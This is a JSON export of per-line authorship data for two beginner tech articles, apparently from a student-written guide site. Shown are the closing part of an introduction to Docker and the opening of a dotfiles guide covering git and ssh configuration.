        "content": "### Why Docker?"
      },
      {
        "lineNumber": 56,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 57,
        "author": {
          "gitId": "-"
        },
        "content": "Docker is a powerful tool that is rapidly gaining popularity. These are some statistics for Docker:"
      },
      {
        "lineNumber": 58,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 59,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cpic src\u003d\"Docker_Statistics.png\" alt\u003d\"Docker Statistics\" width\u003d\"60%\"\u003e"
      },
      {
        "lineNumber": 60,
        "author": {
          "gitId": "-"
        },
        "content": "  "
      },
      {
        "lineNumber": 61,
        "author": {
          "gitId": "-"
        },
        "content": "  \u003csub\u003e_Figure 3. Usage of Docker_ [(source)](https://www.docker.com/company)\u003c/sub\u003e"
      },
      {
        "lineNumber": 62,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 63,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/pic\u003e"
      },
      {
        "lineNumber": 64,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 65,
        "author": {
          "gitId": "-"
        },
        "content": "Many leading companies (e.g. Spotify, Nginx, ElasticSearch etc.) are using Docker for their deployment!"
      },
      {
        "lineNumber": 66,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 67,
        "author": {
          "gitId": "-"
        },
        "content": "If the numbers aren\u0027t enough to convince you to get started on Docker, as compiled by [RedHat](https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/7/html/7.0_release_notes/sect-red_hat_enterprise_linux-7.0_release_notes-linux_containers_with_docker_format-advantages_of_using_docker) here are some of the notable advantages that Docker is able to provide:"
      },
      {
        "lineNumber": 68,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 69,
        "author": {
          "gitId": "-"
        },
        "content": "- **Rapid application deployment** – containers include the minimal runtime requirements of the application, reducing their size and allowing them to be deployed quickly."
      },
      {
        "lineNumber": 70,
        "author": {
          "gitId": "-"
        },
        "content": "- **Portability across machines** – an application and all its dependencies can be bundled into a single container that is independent from the host version of Linux kernel, platform distribution, or deployment model. This container can be transferred to another machine that runs Docker, and executed there without compatibility issues."
      },
      {
        "lineNumber": 71,
        "author": {
          "gitId": "-"
        },
        "content": "- **Version control and component reuse** – you can track successive versions of a container, inspect differences, or roll-back to previous versions. Containers reuse components from the preceding layers, which makes them noticeably lightweight."
      },
      {
        "lineNumber": 72,
        "author": {
          "gitId": "-"
        },
        "content": "- **Sharing** – you can use a remote repository to share your container with others.Red Hat provides a registry for this purpose, and it is also possible to configure your own private repository."
      },
      {
        "lineNumber": 73,
        "author": {
          "gitId": "-"
        },
        "content": "- **Lightweight footprint and minimal overhead** – Docker images are typically very small, which facilitates rapid delivery and reduces the time to deploy new application containers."
      },
      {
        "lineNumber": 74,
        "author": {
          "gitId": "-"
        },
        "content": "- **Simplified maintenance** – Docker reduces effort and risk of problems with application dependencies."
      },
      {
        "lineNumber": 75,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 76,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cbox type\u003d\"danger\"\u003e"
      },
      {
        "lineNumber": 77,
        "author": {
          "gitId": "-"
        },
        "content": "As you can read from above, Docker is undeniably a powerful tool that can alleviate your deployment troubles. However, be aware that Docker is not a one-size-fits-all solution to your problems. Docker also has its limitations e.g. refer to this \u003ca href\u003d\"https://www.channelfutures.com/open-source/when-not-to-use-docker-understanding-the-limitations-of-containers/\"\u003earticle\u003c/a\u003e. Carefully consider your use case before turning to Docker."
      },
      {
        "lineNumber": 78,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/box\u003e"
      },
      {
        "lineNumber": 79,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 80,
        "author": {
          "gitId": "-"
        },
        "content": "Now that we have a good idea of how Docker works and a summary of the notable advantages it is able to provide, let us take a closer look at some of the unique features that Docker is able to provide."
      },
      {
        "lineNumber": 81,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 82,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "#### Feature: Docker is Lightweight "
      },
      {
        "lineNumber": 83,
        "author": {
          "gitId": "-"
        },
        "content": " "
      },
      {
        "lineNumber": 84,
        "author": {
          "gitId": "-"
        },
        "content": "We have discussed above that Docker makes use of a container instead of a full-fledged VM to run your application. We have briefly covered the differences between a VM and a container above."
      },
      {
        "lineNumber": 85,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 86,
        "author": {
          "gitId": "-"
        },
        "content": "The table below lists some of the differences between a VM and a container:"
      },
      {
        "lineNumber": 87,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 88,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cpic src\u003d\"VMvsContainer.png\" alt\u003d\"VM vs Container\" width\u003d\"100%\"\u003e"
      },
      {
        "lineNumber": 89,
        "author": {
          "gitId": "-"
        },
        "content": "  "
      },
      {
        "lineNumber": 90,
        "author": {
          "gitId": "-"
        },
        "content": "  \u003csub\u003e_Figure 4. VM vs Container_ [(source)](https://www.backblaze.com/blog/vm-vs-containers/)\u003c/sub\u003e"
      },
      {
        "lineNumber": 91,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 92,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/pic\u003e"
      },
      {
        "lineNumber": 93,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 94,
        "author": {
          "gitId": "-"
        },
        "content": "The image listed previously in the “What is Docker” section helps to give a pictorial representation of the points listed above in the table. To summarise, a Docker container shares the host OS and runs a discrete process on your operating system (much like any other application). As a result, Docker has a minimal footprint and is much more lightweight. This also makes it faster to run."
      },
      {
        "lineNumber": 95,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 96,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "#### Feature: Docker Allows for Sharing and Reuse"
      },
      {
        "lineNumber": 97,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 98,
        "author": {
          "gitId": "-"
        },
        "content": "Docker containers require a base image to run. An image corresponds to the service you want e.g. python image / ubuntu image etc. An image helps to define what you want your packaged application and its dependencies to look like."
      },
      {
        "lineNumber": 99,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 100,
        "author": {
          "gitId": "-"
        },
        "content": "One of the reasons why Docker is so great is that it provides a shared resource known as the [Docker Hub](https://hub.docker.com/) to download prebuilt images. The docker hub has over a hundred thousand images created by the community that are readily available for use. "
      },
      {
        "lineNumber": 101,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 102,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cpic src\u003d\"DockerHub.png\" alt\u003d\"Docker Hub\" width\u003d\"100%\"\u003e"
      },
      {
        "lineNumber": 103,
        "author": {
          "gitId": "-"
        },
        "content": "  "
      },
      {
        "lineNumber": 104,
        "author": {
          "gitId": "-"
        },
        "content": "  \u003csub\u003e_Figure 5. Docker Hub_ [(source)](https://hub.docker.com/)\u003c/sub\u003e"
      },
      {
        "lineNumber": 105,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 106,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/pic\u003e"
      },
      {
        "lineNumber": 107,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 108,
        "author": {
          "gitId": "-"
        },
        "content": "Hence, no matter what your use case is, there is a good chance that someone else has already built an image for it on the Docker Hub. With Docker, you do not have to spend hours thinking about how to configure your images. On top of that, you are free to augment existing images to fit you exact needs. You can then, share your new image back to the Docker Hub for others to use! "
      },
      {
        "lineNumber": 109,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 110,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "#### Feature: Docker is Accessible"
      },
      {
        "lineNumber": 111,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 112,
        "author": {
          "gitId": "-"
        },
        "content": "On top of the abovementioned advantages, Docker has made it much easier for anyone from developers to system admins to take advantage of containers to quickly build and run applications. Docker allows anyone to package an application on their laptop which in turn can run unmodified on any public cloud or private cloud. Hence the mantra, “build once, run anywhere”."
      },
      {
        "lineNumber": 113,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 114,
        "author": {
          "gitId": "-"
        },
        "content": "Docker is able to do this through what is known as a DockerFile. A DockerFile is  where you write the instructions to build a Docker image. Once a DockerFile is set-up, run `docker build` to build the container. "
      },
      {
        "lineNumber": 115,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 116,
        "author": {
          "gitId": "-"
        },
        "content": "An example of a simple DockerFile is as follows:"
      },
      {
        "lineNumber": 117,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 118,
        "author": {
          "gitId": "-"
        },
        "content": "```bash"
      },
      {
        "lineNumber": 119,
        "author": {
          "gitId": "-"
        },
        "content": "#FROM - Image to start building on."
      },
      {
        "lineNumber": 120,
        "author": {
          "gitId": "-"
        },
        "content": "FROM ubuntu:14.04"
      },
      {
        "lineNumber": 121,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 122,
        "author": {
          "gitId": "-"
        },
        "content": "#RUN - Runs a command in the container"
      },
      {
        "lineNumber": 123,
        "author": {
          "gitId": "-"
        },
        "content": "RUN echo \"Hello Docker!\" \u003e /tmp/hello_docker.txt"
      },
      {
        "lineNumber": 124,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 125,
        "author": {
          "gitId": "-"
        },
        "content": "#CMD - Identifies the command that should be used by default when running the image as a container."
      },
      {
        "lineNumber": 126,
        "author": {
          "gitId": "-"
        },
        "content": "CMD [\"cat\", \"/tmp/hello_docker.txt\"]"
      },
      {
        "lineNumber": 127,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 128,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 129,
        "author": {
          "gitId": "-"
        },
        "content": "As you can see from above, a DockerFile is a series of instructions that is used to build the container. You start with a base image (ubuntu for the example above) and then add more “layers” to the image, with layers representing a portion of the images file system that either adds to or replaces the layer above it. "
      },
      {
        "lineNumber": 130,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 131,
        "author": {
          "gitId": "-"
        },
        "content": "For the example used, the layers are simple bash commands that help print “Hello Docker”. A DockerFile is also able to do much more than this! It can install specific dependencies, it can run a couple of servers, set up configuration files etc. There are plenty of guides available out there that covers the fundamentals behind getting started with this (refer to next section for some links)."
      },
      {
        "lineNumber": 132,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 133,
        "author": {
          "gitId": "-"
        },
        "content": "As a result, Docker is easy to get started with. Once you have configured a DockerFile, you can reuse it everywhere else to run your container! The process for creating a DockerFile is also made easier due to the plethora of resources available and the Docker Hub."
      },
      {
        "lineNumber": 134,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 135,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "#### Feature: Docker is Modular and Scalable"
      },
      {
        "lineNumber": 136,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 137,
        "author": {
          "gitId": "-"
        },
        "content": "As mentioned earlier, Docker makes it much easier to deploy an application that is using a microservices based architecture. For example, you may have Postgres database running in one container, Redis server in another and a Python Flask application in another. Docker makes it much easier to group these containers together and scale/update individual components easily in the future."
      },
      {
        "lineNumber": 138,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 139,
        "author": {
          "gitId": "-"
        },
        "content": "In order to provide a little more clarity to this, let us consider a simple blog application that is running using Nginx, WordPress and MariaDB. We can organise this as follows:"
      },
      {
        "lineNumber": 140,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 141,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cpic src\u003d\"Docker_Microservices.jpg\" alt\u003d\"Docker Microservice Architecture\" width\u003d\"100%\"\u003e"
      },
      {
        "lineNumber": 142,
        "author": {
          "gitId": "-"
        },
        "content": "  "
      },
      {
        "lineNumber": 143,
        "author": {
          "gitId": "-"
        },
        "content": "  \u003csub\u003e_Figure 6. Docker Architecture_ [(source)](https://rubygarage.org/blog/advantages-of-using-docker-for-microservices)\u003c/sub\u003e"
      },
      {
        "lineNumber": 144,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 145,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/pic\u003e"
      },
      {
        "lineNumber": 146,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 147,
        "author": {
          "gitId": "-"
        },
        "content": "Each of the above services is encapsulated in a container using Docker. Docker provides an added functionality called `docker-compose` that allows you to run all the containers at once. `docker-compose` also has added advantages:"
      },
      {
        "lineNumber": 148,
        "author": {
          "gitId": "-"
        },
        "content": "- Preserve volume data when containers are created"
      },
      {
        "lineNumber": 149,
        "author": {
          "gitId": "-"
        },
        "content": "- Only recreate containers that have changed"
      },
      {
        "lineNumber": 150,
        "author": {
          "gitId": "-"
        },
        "content": "- Variables and moving a composition between environments"
      },
      {
        "lineNumber": 151,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 152,
        "author": {
          "gitId": "-"
        },
        "content": "The set-up to use `docker-compose` involves the creation of a YAML file. Detailed information on this is available [here](https://docs.docker.com/compose/overview/)."
      },
      {
        "lineNumber": 153,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 154,
        "author": {
          "gitId": "-"
        },
        "content": "### How to use Docker?"
      },
      {
        "lineNumber": 155,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 156,
        "author": {
          "gitId": "-"
        },
        "content": "At this point, you would have realised the advantages that Docker is able to give you and might be considering to switch over to Docker for your own projects. "
      },
      {
        "lineNumber": 157,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 158,
        "author": {
          "gitId": "-"
        },
        "content": "Here is a learning path that you can follow to pick up Docker:"
      },
      {
        "lineNumber": 159,
        "author": {
          "gitId": "-"
        },
        "content": "- [Docker\u0027s getting started guide](https://docs.docker.com/get-started/) : Docker\u0027s offical documentation is a good place to start out. It is a good overview of the fundamentals behind Docker. They will take you through setting up your own docker environment, building an image, scaling and deploying."
      },
      {
        "lineNumber": 160,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 161,
        "author": {
          "gitId": "-"
        },
        "content": "- [Article covering important concepts behind Docker](https://medium.freecodecamp.org/a-beginner-friendly-introduction-to-containers-vms-and-docker-79a9e3e119b) : After reading the official documentation, this is another excellent article to look through. It covers how Docker works in detail with good examples. "
      },
      {
        "lineNumber": 162,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 163,
        "author": {
          "gitId": "-"
        },
        "content": "- [Books covering specific use cases with Docker](https://github.com/eduleboss/the-best-docker-books) : Once you have a clearer picture on the fundamentals behind Docker, this resource will provide you with a collection of books that show you how to use Docker in a practical setting.  "
      },
      {
        "lineNumber": 164,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 165,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "### Additional Tools - Docker Swarm and Kubernetes"
      },
      {
        "lineNumber": 166,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 167,
        "author": {
          "gitId": "-"
        },
        "content": "If you have managed to familiarise yourself with the functionality that Docker is able to provide and have used Docker for your own projects, here are some additional tools that you might want to look into that make use of Docker."
      },
      {
        "lineNumber": 168,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 169,
        "author": {
          "gitId": "-"
        },
        "content": "Kubernetes is open-source platform created by Google for container deployment operations, scaling up and down, and automation across the clusters of hosts. It is a tool that can help you manage many docker containers. You can read up more about it in their official documentation [here](https://kubernetes.io/docs/tutorials/kubernetes-basics/)"
      },
      {
        "lineNumber": 170,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 171,
        "author": {
          "gitId": "-"
        },
        "content": "Docker Swarm is another alternate tool that is Docker’s own native clustering solution for Docker containers. It monitors the number of containers spread across clusters of servers and is a way to create clustered docker application without additional hardware. The [docker official documentation](https://docs.docker.com/get-started/part4/) gives more information on this."
      },
      {
        "lineNumber": 172,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 173,
        "author": {
          "gitId": "-"
        },
        "content": "### Conclusion / Further Readings"
      },
      {
        "lineNumber": 174,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 175,
        "author": {
          "gitId": "-"
        },
        "content": "In a nutshell, Docker is a lightweight solution to run you application in an isolated environment. Docker provides a convenient out-of-the-box setup to deploy your applications and has added functionality to deploy complex microservices based applications."
      },
      {
        "lineNumber": 176,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 177,
        "author": {
          "gitId": "-"
        },
        "content": "Apart from those listed in the article, here are some further readings/references to get moving with Docker:"
      },
      {
        "lineNumber": 178,
        "author": {
          "gitId": "-"
        },
        "content": "- [Full Guide on multiple aspects of docker](https://docker-curriculum.com/)"
      },
      {
        "lineNumber": 179,
        "author": {
          "gitId": "-"
        },
        "content": "- [Video Series on Docker](https://medium.freecodecamp.org/docker-quick-start-video-tutorials-1dfc575522a0)"
      },
      {
        "lineNumber": 180,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "- [Internals of Docker](https://docker-saigon.github.io/post/Docker-Internals/)"
      },
      {
        "lineNumber": 181,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 182,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/div\u003e"
      }
    ],
    "authorContributionMap": {
      "Tejas2805": 5,
      "jamessspanggg": 1,
      "iskandarzulkarnaien": 9,
      "-": 167
    }
  },
  {
    "path": "contents/dotfiles/Dotfiles.md",
    "fileType": "md",
    "lines": [
      {
        "lineNumber": 1,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "\u003cfrontmatter\u003e"
      },
      {
        "lineNumber": 2,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "  title: Introduction to Dotfiles"
      },
      {
        "lineNumber": 3,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "  header: pagetop.md"
      },
      {
        "lineNumber": 4,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "  footer: footer.md"
      },
      {
        "lineNumber": 5,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "  head: head.md"
      },
      {
        "lineNumber": 6,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "  siteNav: mainNav.md"
      },
      {
        "lineNumber": 7,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "  pageNav: 4"
      },
      {
        "lineNumber": 8,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "\u003c/frontmatter\u003e"
      },
      {
        "lineNumber": 9,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": ""
      },
      {
        "lineNumber": 10,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "\u003cdiv class\u003d\"website-content\"\u003e"
      },
      {
        "lineNumber": 11,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": ""
      },
      {
        "lineNumber": 12,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "{{ booktitle | safe }}"
      },
      {
        "lineNumber": 13,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": ""
      },
      {
        "lineNumber": 14,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "# Introduction to Dotfiles"
      },
      {
        "lineNumber": 15,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": ""
      },
      {
        "lineNumber": 16,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "**Author(s): [Tiu Wee Han](https://github.com/tiuweehan)**\u003cbr\u003e"
      },
      {
        "lineNumber": 17,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "Reviewers: [James Pang](https://github.com/jamessspanggg), [Liu Yiwen](https://github.com/0blivious)"
      },
      {
        "lineNumber": 18,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": ""
      },
      {
        "lineNumber": 19,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "\u003cbox id\u003d\"article-toc\"\u003e"
      },
      {
        "lineNumber": 20,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": ""
      },
      {
        "lineNumber": 21,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "* [Introduction to Dotfiles](#introduction-to-dotfiles)"
      },
      {
        "lineNumber": 22,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "    * [What are Dotfiles?‎](#what-are-dotfiles)"
      },
      {
        "lineNumber": 23,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "    * [Why Dotfiles?](#why-dotfiles)"
      },
      {
        "lineNumber": 24,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "        * [Benefit: Save and Reuse Configurations](#benefit-save-and-reuse-configurations)"
      },
      {
        "lineNumber": 25,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "        * [Benefit: Personalised Shortcuts and Commands‎](#benefit-personalised-shortcuts-and-commands‎)"
      },
      {
        "lineNumber": 26,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "        * [Benefit: Shell Utility and Styling](#benefit-shell-utility-and-styling)‎"
      },
      {
        "lineNumber": 27,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "    * [Management Strategies‎](#management-strategies)"
      },
      {
        "lineNumber": 28,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "    * [Getting Started](#getting-started)"
      },
      {
        "lineNumber": 29,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "    * [Conclusion](#conclusion)"
      },
      {
        "lineNumber": 30,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": ""
      },
      {
        "lineNumber": 31,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "\u003c/box\u003e"
      },
      {
        "lineNumber": 32,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": ""
      },
      {
        "lineNumber": 33,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "### What are Dotfiles?"
      },
      {
        "lineNumber": 34,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "Dotfiles are plain text configuration files on Unix like systems (e.g. MacOS, Linux, BSD). Dotfiles store settings of almost every application, service and tool running on your system. These files control the behavior of applications from boot to termination and everything in between."
      },
      {
        "lineNumber": 35,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": ""
      },
      {
        "lineNumber": 36,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "Some common uses of dotfiles include:"
      },
      {
        "lineNumber": 37,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "- Scripts that run when a Shell is started: `.profile`, `.bashrc`, `.zshrc`"
      },
      {
        "lineNumber": 38,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "- Customising text editors: `.nanorc`, `.vimrc`, `.emacs.d`"
      },
      {
        "lineNumber": 39,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "- Storing settings for commonly used tools (e.g. `git`, `ssh`): `.gitconfig`, `.gitignore`, `.ssh/config`"
      },
      {
        "lineNumber": 40,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": ""
      },
      {
        "lineNumber": 41,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "### Why Dotfiles?"
      },
      {
        "lineNumber": 42,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": ""
      },
      {
        "lineNumber": 43,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "#### Benefit 1: Easy and Centralised Way to Configure Applications"
      },
      {
        "lineNumber": 44,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": ""
      },
      {
        "lineNumber": 45,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "With dotfiles, users have an easy and centralised way to configure their environment and applications. The usage of a file to store configurations also makes it easily shareable and reuseable by other people, as opposed to having to change settings within the application. Dotfiles can be used to configure almost all popular command line tools. In this section, we will explore dotfiles related to `git` and `ssh` - tools frequently used by developers."
      },
      {
        "lineNumber": 46,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": ""
      },
      {
        "lineNumber": 47,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "##### Feature 1.1: Git Dotfiles"
      },
      {
        "lineNumber": 48,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": ""
      },
      {
        "lineNumber": 49,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "`git` is an indispensible tool for many developers and projects, and it is undoubtedly the most popular version control software. Hence, it is highly beneficial to learn how to configure `git` dotfiles."
      },
      {
        "lineNumber": 50,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": ""
      },
      {
        "lineNumber": 51,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "Global settings for `git`, such as the user\u0027s name, email and GitHub username can be specified in the `~/.gitconfig` file. The code below is a bare-bones `~/.gitconfig` file."
      },
      {
        "lineNumber": 52,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "```git"
      },
      {
        "lineNumber": 53,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "[user]"
      },
      {
        "lineNumber": 54,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "  name \u003d John Doe"
      },
      {
        "lineNumber": 55,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "  email \u003d johndoe@gmail.com."
      },
      {
        "lineNumber": 56,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": ""
      },
      {
        "lineNumber": 57,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "[github]"
      },
      {
        "lineNumber": 58,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "  user \u003d johndoe123"
      },
      {
        "lineNumber": 59,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "```"
      },
      {
        "lineNumber": 60,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "Apart from just storing basic details, it can also contain other [information](https://www.atlassian.com/git/tutorials/setting-up-a-repository/git-config) such as merge tools, git color scheme and aliases. This provides a centralised location for a developer to view and edit their git configurations."
      },
      {
        "lineNumber": 61,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": ""
      },
      {
        "lineNumber": 62,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "Another commonly used `git` related dotfile is the `.gitignore` file, which contains a list of files and directories that a developer wants to exclude from git\u0027s version control, such as packages, binaries or secret information. Some files commonly included in `.gitgnore` include:"
      },
      {
        "lineNumber": 63,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "```git"
      },
      {
        "lineNumber": 64,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "node_modules/ # Project specific packages for node projects"
      },
      {
        "lineNumber": 65,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": ".DS_Store     # MacOS file to store folder layout information in the GUI"
      },
      {
        "lineNumber": 66,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": ".vs_code      # Project specific VS code text editor configuration"
      },
      {
        "lineNumber": 67,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "bin/          # Binary executables"
      },
      {
        "lineNumber": 68,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "```"
      },
      {
        "lineNumber": 69,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "This example also illustrates how using dotfiles can add project specific configurations that all developers working on a project will adhere to universally, as opposed to system level settings which may vary from developer to developer."
      },
      {
        "lineNumber": 70,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": ""
      },
      {
        "lineNumber": 71,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "##### Feature 1.2: SSH Dotfiles"
      },
      {
        "lineNumber": 72,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": ""
      },
      {
        "lineNumber": 73,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "For developers and engineers working with remote servers, `ssh` is arguably the most essential tool for connecting and running commands on remote servers. However, for many beginners, working with `ssh` can be a daunting prospect. Configuring dotfiles is a good way to both simplify the usage of `ssh` and learn how to master it effectively."
      },
      {
        "lineNumber": 74,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": ""
      },
      {
        "lineNumber": 75,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "Say a user John wants to connect to a remote server called `remoteA`. Typically, he will run the following command to connect to the server"
      },
      {
        "lineNumber": 76,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "```bash"
      },
      {
        "lineNumber": 77,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "ssh -i ~/.ssh/id_rsa john@remoteAServer.com"
      },
      {
        "lineNumber": 78,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "```"
      },
      {
        "lineNumber": 79,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": ""
      },
      {
        "lineNumber": 80,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "However, this is a relatively long command, and can be tedious to type especially if John accesses `remoteA` frequently. Thankfully for John, he can configure the different hosts by adding the following lines in the `~/.ssh/config` file:"
      },
      {
        "lineNumber": 81,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "```"
